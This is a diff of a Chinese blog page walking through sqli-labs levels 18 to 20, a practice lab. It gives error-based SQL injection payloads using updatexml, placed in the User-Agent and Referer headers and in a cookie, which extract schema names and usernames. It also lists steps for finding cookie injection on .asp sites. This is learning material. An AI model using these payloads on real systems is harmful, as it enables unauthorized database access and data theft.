@@ -91,7 +91,7 @@
 
 <meta name="description" content="愿做人间逍遥客，从此江湖无故人">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql-lab 18及其后题解">
+<meta property="og:title" content="sql-lab 18-20">
 <meta property="og:url" content="https://quan9i.github.io/sql-lab/index.html">
 <meta property="og:site_name" content="quan9i&#39;s blog">
 <meta property="og:description" content="愿做人间逍遥客，从此江湖无故人">
@@ -108,8 +108,8 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/9803859966384fb6a9c4cb3ec2303f78.png">
 <meta property="og:image" content="https://www.yuque.com/docs/share/fbbec285-f658-4d90-a3ee-86142dbaa5d3#">
 <meta property="og:image" content="https://cn.bing.com/?pc=U528">
-<meta property="article:published_time" content="2022-01-04T13:55:13.222Z">
-<meta property="article:modified_time" content="2022-01-06T08:53:48.769Z">
+<meta property="article:published_time" content="2022-01-19T06:44:56.795Z">
+<meta property="article:modified_time" content="2022-01-20T08:48:02.461Z">
 <meta property="article:author" content="quan9i">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -149,7 +149,7 @@
 
 
 
-  <title>sql-lab 18及其后题解 | quan9i's blog</title>
+  <title>sql-lab 18-20 | quan9i's blog</title>
   
 
 
@@ -396,7 +396,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">sql-lab 18及其后题解</h2>
+          <h2 class="post-title" itemprop="name headline">sql-lab 18-20</h2>
         
 
         <div class="post-meta">
@@ -408,8 +408,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-04T21:55:13+08:00">
-                2022-01-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-19T14:44:56+08:00">
+                2022-01-19
               </time>
             
 
@@ -511,15 +511,15 @@
       
         <p><img src="https://img-blog.csdnimg.cn/0b1ba268322a4a82be63d97925a19961.png" alt="在这里插入图片描述"><br>愿做人间逍遥客，从此江湖无故人</p>
 <span id="more"></span>
-<h1 id="sql-lab-18"><a href="#sql-lab-18" class="headerlink" title="sql-lab 18"></a>sql-lab 18</h1><p>观察题目并进行测试<br>发现执行正确时会报出user-agent和本机地址<br>错误时只报出本机地址<br><img src="https://img-blog.csdnimg.cn/669d7de52333452e867cfc86d80396f9.png" alt="在这里插入图片描述"><br>而且我们发现在unname和passwd中进行注入时发现’被转义，所以不能使用这两个来进行注入，这时候只有user -agent 有回显，所以我们可以用user-agent来进行报错注入，首先用burpsuite抓包，然后发送到repeat模块，然后将user-agent内容改为 <code>&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;1&#39;=&#39;1</code>，点击Go运行，查看结果，报出了当前数据库security<br><img src="https://img-blog.csdnimg.cn/243c079b1b4245f4ba592c4b3aae6031.png" alt="在这里插入图片描述"><br>前面的’和后面1的’需要看情况，如果user-agent是用双引号包裹的那就需要改成双引号，遇到题时一一测试即可，关于最后为什么不用加注释符，原因是后面还要其它内容要插入，你用注释符后面就注释掉了，无法正常插入。<br>简单的理解就是user-agent执行后后面还有很多语句要执行，如果加个注释符，后面的就无法执行了（注释符：可以理解为#是把后面所有东西都注释了）</p>
-<h2 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h2><p>User-Agent:<code>&#39; and updatexml(1,concat(0x7e,(select  schema_name from information_schema.schemata limit 1,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/23443afc6dd447768e4f07293ef55147.png" alt="在这里插入图片描述"></p>
-<h2 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select  table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/e56c7af6a31e45499088ef0df827cbbd.png" alt="在这里插入图片描述"></p>
-<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/a6f5e35897694418a6ebeb8787834ad5.png" alt="在这里插入图片描述"></p>
-<h2 id="查询字段信息"><a href="#查询字段信息" class="headerlink" title="查询字段信息"></a>查询字段信息</h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select username from security.users limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/acc43dccb06046d5a6692d931c7c976e.png" alt="在这里插入图片描述"></p>
-<h1 id="sql-lab-19"><a href="#sql-lab-19" class="headerlink" title="sql-lab 19"></a>sql-lab 19</h1><p>发现执行正确时会报出ip地址和 Referer，所以我们可以利用Referer来进行报错注入</p>
-<h2 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h2><p><code>&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/a1569c37c41640c6a17f045e3c472cd1.png" alt="在这里插入图片描述"></p>
-<h2 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h2><p><code>&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/285584c6d278483ea99c9a475b1ea0c3.png" alt="在这里插入图片描述"><br>其他亦是如此，与第18关类似，不再重复</p>
-<h1 id="sql-lab-20"><a href="#sql-lab-20" class="headerlink" title="sql-lab 20"></a>sql-lab 20</h1><p>发现存在多种数据，其中cookie存在回显，测试cookie，在cookie后加上单引号发现可以注入，然后构造payload<br><code>uname=admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code><br><img src="https://img-blog.csdnimg.cn/9803859966384fb6a9c4cb3ec2303f78.png" alt="在这里插入图片描述"><br>其他与此类似，不再重复</p>
+<h1><span id="sql-lab-18">sql-lab 18</span></h1><p>观察题目并进行测试<br>发现执行正确时会报出user-agent和本机地址<br>错误时只报出本机地址<br><img src="https://img-blog.csdnimg.cn/669d7de52333452e867cfc86d80396f9.png" alt="在这里插入图片描述"><br>而且我们发现在unname和passwd中进行注入时发现’被转义，所以不能使用这两个来进行注入，这时候只有user -agent 有回显，所以我们可以用user-agent来进行报错注入，首先用burpsuite抓包，然后发送到repeat模块，然后将user-agent内容改为 <code>&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;1&#39;=&#39;1</code>，点击Go运行，查看结果，报出了当前数据库security<br><img src="https://img-blog.csdnimg.cn/243c079b1b4245f4ba592c4b3aae6031.png" alt="在这里插入图片描述"><br>前面的’和后面1的’需要看情况，如果user-agent是用双引号包裹的那就需要改成双引号，遇到题时一一测试即可，关于最后为什么不用加注释符，原因是后面还要其它内容要插入，你用注释符后面就注释掉了，无法正常插入。<br>简单的理解就是user-agent执行后后面还有很多语句要执行，如果加个注释符，后面的就无法执行了（注释符：可以理解为#是把后面所有东西都注释了）</p>
+<h2><span id="查询数据库名">查询数据库名</span></h2><p>User-Agent:<code>&#39; and updatexml(1,concat(0x7e,(select  schema_name from information_schema.schemata limit 1,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/23443afc6dd447768e4f07293ef55147.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询表名">查询表名</span></h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select  table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/e56c7af6a31e45499088ef0df827cbbd.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询列名">查询列名</span></h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/a6f5e35897694418a6ebeb8787834ad5.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询字段信息">查询字段信息</span></h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select username from security.users limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/acc43dccb06046d5a6692d931c7c976e.png" alt="在这里插入图片描述"></p>
+<h1><span id="sql-lab-19">sql-lab 19</span></h1><p>发现执行正确时会报出ip地址和 Referer，所以我们可以利用Referer来进行报错注入</p>
+<h2><span id="查询当前数据库">查询当前数据库</span></h2><p><code>&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/a1569c37c41640c6a17f045e3c472cd1.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询数据库">查询数据库</span></h2><p><code>&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/285584c6d278483ea99c9a475b1ea0c3.png" alt="在这里插入图片描述"><br>其他亦是如此，与第18关类似，不再重复</p>
+<h1><span id="sql-lab-20">sql-lab 20</span></h1><p>发现存在多种数据，其中cookie存在回显，测试cookie，在cookie后加上单引号发现可以注入，然后构造payload<br><code>uname=admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code><br><img src="https://img-blog.csdnimg.cn/9803859966384fb6a9c4cb3ec2303f78.png" alt="在这里插入图片描述"><br>其他与此类似，不再重复</p>
 <p>扩充：<br>判断cookie注入的条件<br>条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。<br>条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。<br>判断网站是否存在cookie注入漏洞<br>1.寻找形如“.asp?id=xx”类的带参数的URL。<br>2.去掉“id=xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的。<br>3.清空浏览器地址栏，输入“javascript:alert(document.cookie=“id=”+escape(“xx”));”，按Enter键后弹出一个对话框，内容是“id=xx”，然后用原来的URL刷新页面，如果显示正常，说明应用是用Request(“id”)这种方式获取数据的。<br>4.重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie=“id=”+escape(“xx and 1=1”));”<br>“javascript:alert(document.cookie=“id=”+escape(“xx and 1=2”));”。<br>和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入。<br>5.使用常规注入语句进行注入即可。<br><img src="https://www.yuque.com/docs/share/fbbec285-f658-4d90-a3ee-86142dbaa5d3#" alt="大佬讲解链接"><br><img src="https://cn.bing.com/?pc=U528" alt="必应"><br>前二十关至此结束！</p>
 
       
@@ -586,7 +586,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://quan9i.github.io/sql-lab/" title="sql-lab 18及其后题解">https://quan9i.github.io/sql-lab/</a>
+    <a href="https://quan9i.github.io/sql-lab/" title="sql-lab 18-20">https://quan9i.github.io/sql-lab/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -630,8 +630,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" rel="next" title="联合查询">
-                <i class="fa fa-chevron-left"></i> 联合查询
+              <a href="/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" rel="next" title="二次注入">
+                <i class="fa fa-chevron-left"></i> 二次注入
               </a>
             
           </div>
@@ -640,8 +640,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" rel="prev" title="sql-lab 源码分析">
-                sql-lab 源码分析 <i class="fa fa-chevron-right"></i>
+              <a href="/sql-lab23%E5%90%AF/" rel="prev" title="sql-lab 23-27">
+                sql-lab 23-27 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -728,7 +728,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -739,7 +739,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -750,7 +750,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -818,7 +818,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-lab-18"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 18</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.1.</span> <span class="nav-text">查询数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="nav-number">1.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D"><span class="nav-number">1.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-lab-19"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 19</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.</span> <span class="nav-text">查询当前数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.2.</span> <span class="nav-text">查询数据库</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-lab-20"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 20</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 18</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.1.</span> <span class="nav-text">查询数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 19</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">查询当前数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">查询数据库</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 20</span></a></li></ol></div>
             
 
           </div>
@@ -847,7 +847,15 @@
       
       
         <li class="recent_posts_li">
-          <a href="/sql-lab23%E5%90%AF/" title="sql-lab 23-25" target="_blank">sql-lab 23-25</a>
+          <a href="/web%E6%96%B0%E6%89%8B%E9%A2%98%E9%A2%98%E8%A7%A3/" title="ctfshow-web信息搜集(入门1-20)" target="_blank">ctfshow-web信息搜集(入门1-20)</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sql-lab23%E5%90%AF/" title="sql-lab 23-27" target="_blank">sql-lab 23-27</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sql-lab/" title="sql-lab 18-20" target="_blank">sql-lab 18-20</a>
         </li>
       
         <li class="recent_posts_li">
@@ -856,14 +864,6 @@
       
         <li class="recent_posts_li">
           <a href="/python%20for%20sql/" title="使用python脚本来自动爆破sql-lab" target="_blank">使用python脚本来自动爆破sql-lab</a>
-        </li>
-      
-        <li class="recent_posts_li">
-          <a href="/python%E6%8F%92%E4%BB%B6/" title="python request模块安装及所遇问题小记" target="_blank">python request模块安装及所遇问题小记</a>
-        </li>
-      
-        <li class="recent_posts_li">
-          <a href="/python/" title="python学习笔记 part 1" target="_blank">python学习笔记 part 1</a>
         </li>
       
     </ul>
@@ -902,7 +902,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">25.1k</span>
+    <span title="Site words total count">27.7k</span>
   
 </div>
 
